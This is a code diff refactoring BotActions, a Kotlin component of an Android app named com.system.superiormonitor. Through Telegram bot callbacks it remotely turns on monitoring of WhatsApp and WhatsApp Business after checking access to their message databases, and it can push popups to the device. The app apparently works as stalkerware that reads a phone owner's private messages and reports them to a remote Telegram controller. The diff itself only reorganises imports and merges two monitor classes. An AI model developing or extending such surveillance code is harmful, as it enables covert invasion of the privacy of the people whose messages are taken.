@@ -1,6 +1,6 @@
 package com.system.superiormonitor.bot
 
-import com.system.superiormonitor.util.LogLevel
+import com.system.superiormonitor.core.LogLevel
 
 import android.content.ComponentName
 import android.content.Context
@@ -9,8 +9,8 @@ import android.content.pm.PackageManager
 import android.net.Uri
 import com.system.superiormonitor.MainActivity
 import com.system.superiormonitor.data.PrefsManager
-import com.system.superiormonitor.util.LogCategory
-import com.system.superiormonitor.util.LogManager
+import com.system.superiormonitor.core.LogCategory
+import com.system.superiormonitor.core.LogManager
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
@@ -55,7 +55,7 @@ object BotActions {
     }
 
     fun showDevicePopup(context: Context, text: String) {
-        val intent = Intent(context, com.system.superiormonitor.ui.PopupActivity::class.java).apply {
+        val intent = Intent(context, com.system.superiormonitor.core.PopupActivity::class.java).apply {
             flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
             putExtra("POPUP_MESSAGE", text)
         }
@@ -179,11 +179,11 @@ object BotActions {
         if (data == "toggle_whatsapp") {
             if (!prefs.whatsappUpdatesEnabled) {
                 // We are trying to ENABLE it, run checks first.
-                if (!com.system.superiormonitor.monitor.WhatsAppMonitor.isWhatsAppInstalled(context)) {
+                if (!com.system.superiormonitor.monitor.WhatsAppMonitor.isWhatsAppInstalled(context, com.system.superiormonitor.monitor.WhatsAppVariant.NORMAL)) {
                     TelegramApi.answerCallbackQuery(token, queryId, "WhatsApp is not installed on this device. Please install WhatsApp before enabling this feature.", true)
                     return
                 }
-                val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.WhatsAppMonitor.checkWhatsAppDatabase()
+                val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.WhatsAppMonitor.checkWhatsAppDatabase(com.system.superiormonitor.monitor.WhatsAppVariant.NORMAL)
                 if (!dbAvailable) {
                     TelegramApi.answerCallbackQuery(token, queryId, dbReason, true)
                     return
@@ -201,11 +201,11 @@ object BotActions {
         } else if (data == "toggle_wabusiness") {
             if (!prefs.whatsappBusinessUpdatesEnabled) {
                 // We are trying to ENABLE it, run checks first.
-                if (!com.system.superiormonitor.monitor.WABusinessMonitor.isWhatsAppInstalled(context)) {
+                if (!com.system.superiormonitor.monitor.WhatsAppMonitor.isWhatsAppInstalled(context, com.system.superiormonitor.monitor.WhatsAppVariant.BUSINESS)) {
                     TelegramApi.answerCallbackQuery(token, queryId, "WhatsApp Business is not installed on this device. Please install WhatsApp Business before enabling this feature.", true)
                     return
                 }
-                val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.WABusinessMonitor.checkWhatsAppDatabase()
+                val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.WhatsAppMonitor.checkWhatsAppDatabase(com.system.superiormonitor.monitor.WhatsAppVariant.BUSINESS)
                 if (!dbAvailable) {
                     TelegramApi.answerCallbackQuery(token, queryId, dbReason, true)
                     return
